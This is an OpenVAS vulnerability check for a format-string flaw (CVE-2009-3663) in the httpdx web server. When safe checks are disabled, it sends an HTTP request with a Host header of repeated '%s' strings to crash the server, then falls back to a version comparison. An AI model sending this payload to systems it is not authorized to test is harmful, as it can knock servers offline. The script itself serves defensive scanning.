###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_httpdx_web_server_format_string_vuln.nasl 15 2013-10-27 12:49:54Z jan $
#
# httpdx 'h_readrequest()' Host Header Format String Vulnerability
#
# Authors:
# Nikita MR <rnikita@secpod.com>
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to crash an affected server or
  execute arbitrary code via a specially crafted request.
  Impact Level: Application";
tag_affected = "httpdx Web Server version 1.4 and prior on windows.";
tag_insight = "A format string error exists in the 'h_readrequest()' [httpd_src/http.cpp]
  function when processing the HTTP 'Host:' header.";
tag_solution = "Upgrade to httpdx Server version 1.4.1 or later
  http://sourceforge.net/projects/httpdx/";
tag_summary = "The host is running httpdx Web Server and is prone to Format String
  vulnerability.";

if(description)
{
  script_id(800961);
  script_version("$Revision: 15 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2009-10-23 16:18:41 +0200 (Fri, 23 Oct 2009)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_cve_id("CVE-2009-3663");
  script_name("httpdx 'h_readrequest()' Host Header Format String Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/36734");
  script_xref(name : "URL" , value : "http://www.milw0rm.com/exploits/9657");
  script_xref(name : "URL" , value : "http://www.vupen.com/english/advisories/2009/2654");

  script_description(desc);
  script_summary("Check for attack and version of httpdx Web Server");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2009 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("gb_httpdx_server_detect.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");

httpdxPort = get_http_port(default:80);
if(!httpdxPort){
  exit(0);
}

httpdxVer = get_kb_item("httpdx/" + httpdxPort + "/Ver");
if(isnull(httpdxVer)){
  exit(0);
}

if(!safe_checks())
{
  # Send the malicious string in Host header.
  sndReq = string('GET /',' HTTP/1.1\r\n',
                  'OpenVAS: deflate,gzip;q=0.3\r\n',
                  'Connection: OpenVAS, close\r\n',
                  'Host: ', crap(length: 32, data: "%s"), '\r\n',
                  'User-Agent: OpenVAS\r\n\r\n');
  rcvRes = http_send_recv(port:httpdxPort, data:sndReq);
  rcvRes = http_send_recv(port:httpdxPort, data:sndReq);
  if(isnull(rcvRes))
  {
    security_hole(httpdxPort);
    exit(0);
  }
}

# Check for versions prior to 1.4.1
if(version_is_less(version:httpdxVer, test_version:"1.4.1")){
  security_hole(httpdxPort);
}
